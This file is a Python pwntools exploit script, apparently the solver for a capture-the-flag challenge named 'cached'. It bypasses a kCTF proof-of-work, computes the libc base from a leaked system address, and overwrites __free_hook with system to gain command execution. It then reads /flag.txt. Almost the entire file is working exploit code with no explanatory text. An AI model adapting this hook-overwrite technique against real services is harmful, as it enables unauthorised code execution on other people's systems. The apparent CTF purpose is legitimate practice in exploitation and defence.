#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("/home/user/cached")
libc = ELF("/home/user/libc-2.31.so")

#conn = elf.process()
conn = remote("localhost", 1337)

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

print(conn.recvuntil('== proof-of-work: '))
if conn.recvline().startswith(b'enabled'):
    handle_pow(conn)

conn.sendline("")
conn.sendline("")
conn.sendline("")
conn.sendline("")

conn.recvuntil("system @")
libc.address = int(conn.recvline(), 0) - libc.symbols["system"]

conn.sendline(p64(libc.symbols["__free_hook"]));
conn.sendline(p64(libc.symbols["system"]));

for _ in range(8):
  conn.recvuntil("```\n")

conn.sendline("cat /flag.txt")
flag = conn.recvline()

if b"idek" in flag:
  print(flag)
  exit(0)
else:
  exit(1)

conn.interactive()
